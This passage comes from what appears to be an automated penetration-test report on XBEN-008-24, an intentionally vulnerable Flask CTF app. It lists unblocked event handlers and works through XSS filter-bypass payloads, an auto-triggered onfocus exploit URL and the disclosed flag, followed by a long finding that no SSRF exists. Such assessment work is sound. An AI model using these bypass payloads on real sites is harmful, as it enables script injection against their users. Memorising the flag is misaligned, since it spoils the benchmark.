Result: Triggers CSS animation, fires event handler
```

**Complete list of unblocked event handlers**:
- Focus events: `onfocus`, `onblur`, `onfocusin`, `onfocusout`
- Input events: `oninput`, `onchange`, `onselect`
- Form events: `onsubmit`, `onreset`
- Mouse events: `onmouseenter`, `onmouseleave`, `onmousedown`, `onmouseup`, `onmousemove`, `onmouseout`, `oncontextmenu`, `onwheel`, `ondblclick`
- Pointer events: `onpointerover`, `onpointerenter`, `onpointerdown`, `onpointerup`, `onpointermove`, `onpointerout`, `onpointerleave`, `onpointercancel`, `ongotpointercapture`, `onlostpointercapture`
- Drag events: `ondrag`, `ondragend`, `ondragenter`, `ondragleave`, `ondragover`, `ondragstart`, `ondrop`
- Animation/Transition events: `onanimationstart`, `onanimationend`, `onanimationiteration`, `ontransitionstart`, `ontransitionend`, `ontransitioncancel`
- Other: `onresize`, `onscroll`, `onsearch`, `ontoggle`, `onwaiting`, `onvolumechange`, `ontimeupdate`, etc.

**Bypass Method 2: Tag Injection (Closing Input Tag)**

The `script` keyword is blocked, but other tags are not:

```
Payload: "><img src=x onerror=alert(1)>
Rendered: <input type=text name=name placeholder="..." > "><img src=x onerror=alert(1)>>
Result: Closes input tag early, creates new img tag with onerror handler (but "onerror" is blocked!)

Payload: "><img src=x onload=alert(1)>
Result: "onload" is blocked

Payload: "><iframe onload=alert(1)>
Result: "onload" is blocked

Payload: "><video src=x onloadstart=alert(1)>
Rendered: <input...> "><video src=x onloadstart=alert(1)>>
Result: Creates video tag with onloadstart event (onloadstart not blocked!)

Payload: "><body onfocus=alert(1) autofocus>
Result: Creates body tag with onfocus (not blocked)
```

**Bypass Method 3: Quote Escaping**

Single quotes are blocked, but **double quotes and backticks are not**:

```
Payload: " autofocus onfocus="alert(1)
Rendered: <input type=text name=name placeholder="..." > " autofocus onfocus="alert(1)>
Result: Double quotes escape attribute context

Payload: " autofocus onfocus=alert`1`
Result: Backticks can be used for template literals (but browser support varies)
```

**Bypass Method 4: PhantomJS Auto-Trigger Assistance**

The `check.js` validation script **actively assists exploitation** by triggering focus events:

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/check.js:27-33`

```javascript
page.evaluate(function() {
    var autofocusElements = document.querySelectorAll('[autofocus], [onfocus]');
    for (var i = 0; i < autofocusElements.length; i++) {
        autofocusElements[i].focus();
    }
});
```

This code finds any element with `autofocus` or `onfocus` attributes and triggers the `focus()` method, **automatically executing the payload** without user interaction.

**Canonical Exploitation Payload**:

```
URL: http://localhost:5000/page?name=autofocus%20onfocus=alert(document.domain)

Rendered HTML:
<input type=text name=name placeholder="Enter your name..." > autofocus onfocus=alert(document.domain)>

PhantomJS Execution:
1. Loads HTML file
2. Finds element with [autofocus] or [onfocus] attribute
3. Calls .focus() method on element
4. Triggers onfocus=alert(document.domain)
5. Detects alert() call
6. Outputs "SUCCESS" to Flask app

Flask Response:
"Congratulations! Here is the flag: flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}"
```

### Secondary XSS Sink: Error Message Reflection (NOT EXPLOITABLE)

**Location**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:71`

```python
error_msg = """<div class="solution-text">Sorry you can't use: '%s'</div>""" % word
```

**Exploitability**: **NOT EXPLOITABLE**

**Reason**: The `%s` placeholder is replaced with `word`, which comes from the **hardcoded blacklist array**, not from user input. This is safe reflection of application-controlled data.

### Output Encoding (Inconsistent)

**Safe Usage**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:58`

```python
data = '<div class="solution-text"><img src="{0}" alt="Fail" width="150" height="150"><br>Incorrect output: {1}</div>'.format(IMAGE_ROUTES[tag]['process'], cgi.escape(result))
```

The `result` variable (PhantomJS output) is encoded with `cgi.escape()`, preventing XSS via PhantomJS output manipulation. However, this encoding is **not applied to user input** (`msg` variable), creating the exploitable XSS vulnerability.

### XSS Success Condition (Flag Disclosure)

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/check.js:8-18`

```javascript
page.onAlert = function(msg) {
    console.log('SUCCESS');
};

page.onConfirm = function(msg) {
    console.log('SUCCESS');
};

page.onPrompt = function(msg) {
    console.log('SUCCESS');
};
```

PhantomJS intercepts JavaScript dialog methods (`alert()`, `confirm()`, `prompt()`) and outputs `"SUCCESS"` to stdout. The Flask application reads this output and discloses the flag if `"SUCCESS"` is detected.

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:55-57`

```python
if result == 'SUCCESS':
    data = '<div class="solution-text"><img src="{0}" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: {1}</div>'.format(IMAGE_ROUTES[tag]['success'],flags[0])
```

### No Other XSS Sinks Found

**Comprehensive analysis confirms**:
- ❌ No `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()` in client-side code
- ❌ No client-side JavaScript files (all HTML is server-rendered)
- ❌ No JavaScript context sinks (`eval()`, `Function()`, `setTimeout()` with strings)
- ❌ No CSS context sinks (dynamic style manipulation)
- ❌ No URL context sinks (`location.href`, `window.open()` with user input)
- ❌ No template injection (uses Python `.format()`, not template engines like Jinja2)
- ❌ No jQuery or other JavaScript libraries that might introduce DOM-based XSS

### Summary Table

| Sink Type | Location | Line | Render Context | Exploitability | Severity |
|-----------|----------|------|----------------|----------------|----------|
| HTML Attribute Injection | `app.py` → `/page` | 67, 78 | `<input>` tag attributes | **Direct** (trivial bypass) | **CRITICAL** |
| Error Message Reflection | `app.py` | 71 | HTML body | **Not Exploitable** (server data only) | N/A |

**Total Exploitable XSS Sinks: 1**

---

## 10. SSRF Sinks

### Comprehensive SSRF Analysis

After thorough analysis of all application code, configuration files, and dependencies, **NO SSRF (Server-Side Request Forgery) vulnerabilities exist** in this application's network-accessible attack surface.

### PhantomJS Subprocess (NOT SSRF)

**Component**: PhantomJS Headless Browser Navigation  
**Location**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/check.js:20`

```javascript
var input = system.stdin.readLine();
var page = require("webpage").create();
page.open(input, function(status) {
    // ... page evaluation ...
});
```

**Analysis**:

PhantomJS's `page.open()` method loads a URL, which **superficially resembles SSRF**. However, this is **NOT exploitable as SSRF** because:

1. **URL Construction is Server-Controlled**:

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:35-36`

```python
fn = "static/" + os.urandom(16).encode('hex') + '.html'
url = 'http://localhost:5000/' + fn
```

The URL passed to PhantomJS is **hardcoded** to `http://localhost:5000/<random_hex>.html`. The user has **zero control** over the destination URL.

2. **User Input Controls HTML Content, Not URL**:

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:38-43`

```python
of = open(fn, 'w')
of.write(page)  # 'page' contains user-controlled HTML
of.close()
print "Page:"
print page
proc.stdin.write(url)  # 'url' is hardcoded, not user-controlled
```

User input (`msg` variable) influences the **HTML content** written to the file, but does not influence the **URL** that PhantomJS navigates to. This is an **XSS vulnerability** (user controls rendered HTML), not SSRF (user controls destination URL).

3. **Filename Randomization Prevents Prediction**:

The filename uses `os.urandom(16).encode('hex')`, generating 32 hexadecimal characters (128 bits of entropy):

```
Example: http://localhost:5000/static/a3f8c9d2e1b4f7a6c8d9e2f3a1b4c5d6.html
```

An attacker cannot predict this filename to trick PhantomJS into loading attacker-controlled content from the filesystem.

4. **Localhost Restriction**:

PhantomJS always navigates to `http://localhost:5000/`, never to external URLs. This is **not SSRF** because:
- SSRF requires the server to make requests to **attacker-controlled destinations**
- This application only makes requests to **itself** (localhost loopback)
- No mechanism exists to influence the destination host, port, protocol, or path beyond the application's own static directory

**Conclusion**: PhantomJS navigation is **NOT SSRF**. It is a component of the XSS challenge mechanism, not a server-side request forgery vulnerability.

### No HTTP Client Libraries

**Analysis**: The application does **NOT use any HTTP client libraries** for outbound requests:

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:1-12` (imports)

```python
from flask import Flask, request, Response, make_response, url_for
import logging
import subprocess
import os
from constants import *
import cgi
import urllib  # IMPORTED BUT NEVER USED
```

**Finding**: `urllib` is imported (line 9) but **never referenced** in the application code. Searching for HTTP client usage:

- ❌ No `urllib.urlopen()`, `urllib.request.urlopen()`, `urllib2.urlopen()`
- ❌ No `requests.get()`, `requests.post()`, `requests.request()`
- ❌ No `httplib` or `http.client` usage
- ❌ No `httpx`, `aiohttp`, `urllib3` imports or usage

**Conclusion**: The application makes **zero outbound HTTP requests** beyond PhantomJS navigating to `localhost`.

### No Socket Connections

**Analysis**: The application does **NOT create raw socket connections**:

- ❌ No `socket.socket()` instantiation
- ❌ No `socket.connect()` calls
- ❌ No TCP/UDP client sockets
- ❌ No network programming beyond Flask's inbound HTTP server

### No File Inclusion from URLs

**Analysis**: The application does **NOT load files from URLs**:

- ❌ No `open()` calls with URL arguments
- ❌ No XML/HTML parsers loading external entities
- ❌ No XXE (XML External Entity) vulnerabilities (no XML parsing)
- ❌ No YAML file loading (no PyYAML usage)
- ❌ No configuration file fetching from URLs

### No Redirect Following

**Analysis**: The application does **NOT implement redirects**:

- ❌ No `response.redirect()` with user input
- ❌ No `Location` header construction
- ❌ No "Return URL" or "Next URL" parameters
- ❌ No open redirect vulnerabilities

**Note**: Flask does not auto-follow redirects (no HTTP client), so redirect-following SSRF is not applicable.

### No Headless Browser Navigation with User URLs

**Finding**: While PhantomJS **is used** as a headless browser, it navigates to **hardcoded localhost URLs only**:

- ✅ PhantomJS exists (check.js)
- ❌ No user control over navigation destination
- ❌ No `page.goto(user_input)` patterns
- ✅ Only navigates to `http://localhost:5000/static/<random>.html`

**Not SSRF**: PhantomJS does not navigate to attacker-controlled destinations.

### No Media Processing with URLs

**Analysis**: The application does **NOT process media from URLs**:

- ❌ No ImageMagick, GraphicsMagick, or PIL/Pillow usage
- ❌ No FFmpeg or video processing
- ❌ No image optimization services
- ❌ No PDF generation from URLs (no wkhtmltopdf, WeasyPrint, etc.)

### No Link Preview or Unfurl Functionality

**Analysis**: The application does **NOT fetch URL metadata**:

- ❌ No oEmbed endpoint fetching
- ❌ No Open Graph / Twitter Card parsing
- ❌ No URL preview generation
- ❌ No link expansion or shortening

### No Webhook Testing or Callbacks

**Analysis**: The application does **NOT implement webhook testing**:

- ❌ No "ping my webhook" functionality
- ❌ No outbound callback verification
- ❌ No health check notifications to external URLs
- ❌ No event delivery to external endpoints

### No SSO/OIDC Discovery or JWKS Fetching

**Analysis**: The application does **NOT integrate with SSO/OIDC**:

- ❌ No OpenID Connect discovery (`.well-known/openid-configuration`)
- ❌ No JWKS (JSON Web Key Set) fetching
- ❌ No OAuth authorization server metadata retrieval
- ❌ No SAML metadata fetching

**Reason**: The application has **no authentication system**, so SSO/OIDC integration does not exist.

### No Importers or Data Loaders

**Analysis**: The application does **NOT import data from URLs**:

- ❌ No "Import from URL" functionality
- ❌ No CSV/JSON/XML remote loading
- ❌ No RSS/Atom feed readers
- ❌ No API data synchronization
- ❌ No remote configuration file fetching

### No Package/Plugin Installers

**Analysis**: The application does **NOT install packages from URLs**:

- ❌ No "Install from URL" features
- ❌ No plugin/theme downloaders
- ❌ No update mechanisms with remote checks

### No Monitoring or Health Check Outbound Requests

**Analysis**: The application does **NOT make monitoring requests**:

- ❌ No URL pingers or uptime checkers
- ❌ No alerting webhook senders
- ❌ No performance testing tools
- ❌ No external monitoring integrations

### No Cloud Metadata API Access

**Analysis**: The application does **NOT access cloud metadata APIs**:

- ❌ No AWS metadata (`http://169.254.169.254`)
- ❌ No GCP metadata (`http://metadata.google.internal`)
- ❌ No Azure metadata (`http://169.254.169.254`)
- ❌ No instance metadata service queries

**Note**: Even if deployed in cloud environments (AWS, GCP, Azure), the application code does not attempt to access instance metadata endpoints.

### Conclusion: No SSRF Sinks on Network-Accessible Surfaces

**Finding**: **NO SSRF VULNERABILITIES EXIST**

After exhaustive analysis of all code paths, dependencies, and configuration files, this application contains:
- ✅ Zero HTTP client usage
- ✅ Zero raw socket connections
- ✅ Zero file inclusion from URLs
- ✅ Zero redirect following mechanisms
- ✅ Zero media processing with URLs
- ✅ Zero webhook/callback functionality
- ✅ Zero SSO/OIDC integration
- ✅ Zero data import from URLs
- ✅ Zero cloud metadata access

**PhantomJS is NOT SSRF** because it navigates exclusively to hardcoded localhost URLs with server-controlled filenames. User input influences HTML content (XSS), not destination URLs (SSRF).

**No SSRF sinks found on network-accessible surfaces.**

---

## End of Report

**Analysis Completed**: 2025-10-31  
**Application**: XBEN-008-24 "Dalgona Challenges" (Flask Python 2.7 CTF Platform)  
**Total Files Analyzed**: 10 (3 Python, 1 JavaScript, 6 configuration/asset files)  
**Network-Accessible Entry Points**: 3 (Index, Challenge Page, Static Files)  
**Critical Vulnerabilities**: 5 (FLAG in git, Debug mode, XSS, Python 2.7 EOL, PhantomJS deprecated)  
**Intentional Vulnerabilities**: 1 (XSS challenge)  
**SSRF Vulnerabilities**: 0  
**Authentication**: None  
**Authorization**: None  
**Database**: None

## Authenticated Scans

### SCHEMATHESIS
Status: skipped
Schemas directory not found

---
Report generated at: 2025-10-31T08:18:58.674Z